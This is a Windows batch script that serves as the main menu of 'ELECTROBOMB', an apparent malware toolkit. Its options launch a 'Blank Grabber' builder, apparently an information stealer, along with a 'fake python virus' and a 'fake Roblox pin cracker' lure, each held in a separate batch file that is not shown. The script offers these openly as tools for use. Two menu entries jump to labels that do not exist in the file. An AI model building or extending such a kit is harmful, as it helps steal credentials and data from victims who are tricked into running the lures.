@echo off
title ELECTROBOMB - main
chcp 65001 >nul
color 5



    
 
   

cd _files



:menu
cls
call :banner
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A

echo.
echo.
echo [38;2;128;0;128m        ╔═(1)Blank Grabber═══════════════════════════(5)Fake Roblox pin cracker(Select for infos)[0m  
echo [38;2;144;0;144m        ║[0m  
echo [38;2;160;0;160m        ╠══(2)Install python═════════════════════════(6)Coming soon...[0m  
echo [38;2;176;0;176m        ║[0m  
echo [38;2;192;0;192m        ╠═══(3)Fake python virus═════════════════════(7)Coming soon...[0m  
echo [38;2;208;0;208m        ║[0m  
echo [38;2;208;0;208m        ╚╦═══(4)Infos════════════════════════════════(8)Send a message to us[0m  
echo [38;2;208;0;208m         ║[0m  
set /p input=.%BS% [38;2;208;0;208m        ╚═════╦^>[0m  

if /I "%input%"=="1" call Builder.bat
if /I "%input%"=="2" call ipy.bat
if /I "%input%"=="3" call pchos.bat
if /I "%input%"=="4" call info.bat
if /I "%input%"=="5" call frpc.bat
if /I "%input%"=="6" goto Fex
if /I "%input%"=="7" goto Rick
if /I "%input%"=="8" call discord.bat

pause

:banner

echo.
echo.
echo               [38;2;128;0;128m███████╗██╗     ███████╗ ██████╗████████╗██████╗  ██████╗ ██████╗  ██████╗ ███╗   ███╗██████╗ [0m     
echo               [38;2;144;0;144m██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗[0m
echo               [38;2;160;0;160m█████╗  ██║     █████╗  ██║        ██║   ██████╔╝██║   ██║██████╔╝██║   ██║██╔████╔██║██████╔╝[0m 
echo               [38;2;176;0;176m██╔══╝  ██║     ██╔══╝  ██║        ██║   ██╔══██╗██║   ██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗[0m
echo               [38;2;192;0;192m███████╗███████╗███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝[0m
echo               [38;2;208;0;208m╚══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ [0m
echo.
